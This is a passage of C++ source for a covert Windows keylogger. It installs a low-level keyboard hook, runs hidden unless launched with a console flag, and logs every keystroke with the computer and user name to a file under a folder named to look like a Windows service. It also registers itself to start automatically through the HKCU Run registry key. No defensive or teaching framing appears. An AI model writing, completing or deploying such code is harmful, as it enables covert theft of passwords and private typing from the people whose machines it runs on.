BOOL WINAPI ConsoleCtrlHandler(DWORD type)
{
    switch (type) {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
            if (g_mainThread)
                PostThreadMessageW(g_mainThread, WM_QUIT, 0, 0);
            Sleep(200);
            return TRUE;
        default:
            return FALSE;
    }
}

int RunLogger()
{
    MSG msg;
    PeekMessageW(&msg, nullptr, 0, 0, PM_NOREMOVE);   // force queue creation

    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc,
                               GetModuleHandleW(nullptr), 0);
    if (!g_hook) {
        if (g_echo) wprintf(L"SetWindowsHookEx failed: %lu\n", GetLastError());
        return 1;
    }

    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    g_hook = nullptr;
    return 0;
}

} // namespace

// ---------------------------------------------------------------------------
//  Entry point
// ---------------------------------------------------------------------------

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR lpCmdLine, int)
{
    g_mainThread = GetCurrentThreadId();

    if (lpCmdLine && wcsstr(lpCmdLine, L"--console")) {
        if (AllocConsole()) {
            g_echo = true;
            FILE* f = nullptr;
            freopen_s(&f, "CONOUT$", "w", stdout);
            freopen_s(&f, "CONOUT$", "w", stderr);
            SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);
        }
    }

    HANDLE singleton = CreateMutexW(nullptr, TRUE, kSingletonName);
    if (!singleton || GetLastError() == ERROR_ALREADY_EXISTS)
        return 0;

    g_layout = GetKeyboardLayout(0);

    // Log destination: %LOCALAPPDATA%\WinKeySvc\keystrokes.log
    std::wstring base = Env(L"LOCALAPPDATA");
    if (base.empty()) base = Env(L"APPDATA");
    if (base.empty()) base = L"C:\\ProgramData";

    const std::wstring logDir  = base + L"\\" + kSelfDirName;
    const std::wstring logPath = logDir + L"\\" + kLogFileName;

    if (!EnsureDir(logDir)) {
        if (g_echo) wprintf(L"cannot create %ls\n", logDir.c_str());
        return 1;
    }

    g_log = CreateFileW(logPath.c_str(),
                        FILE_APPEND_DATA,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (g_log == INVALID_HANDLE_VALUE) {
        if (g_echo) wprintf(L"cannot open %ls (err %lu)\n", logPath.c_str(), GetLastError());
        return 1;
    }

    std::wstring header = L"=== session start ";
    header += Env(L"COMPUTERNAME");
    if (header.back() == L' ') { /* hostname missing */ }
    header += L"\\";
    header += Env(L"USERNAME");
    header += L" pid=";
    wchar_t pidbuf[16];
    swprintf_s(pidbuf, ARRAYSIZE(pidbuf), L"%lu", GetCurrentProcessId());
    header += pidbuf;
    header += L" ===";
    LogLine(header);

    if (!InstallPersistence()) {
        if (g_echo) wprintf(L"persistence install failed: %lu\n", GetLastError());
    } else if (g_echo) {
        wprintf(L"persistence registered under HKCU Run\n");
    }

    if (g_echo) {
        wprintf(L"logging to %ls\n", logPath.c_str());
        wprintf(L"exit hotkey: Ctrl+Alt+Shift+F12\n");
    }

    const int rc = RunLogger();

    LogLine(L"=== session end ===");
    if (g_log != INVALID_HANDLE_VALUE) {
        FlushFileBuffers(g_log);
        CloseHandle(g_log);
        g_log = INVALID_HANDLE_VALUE;
    }
    if (singleton) CloseHandle(singleton);
    return rc;
}
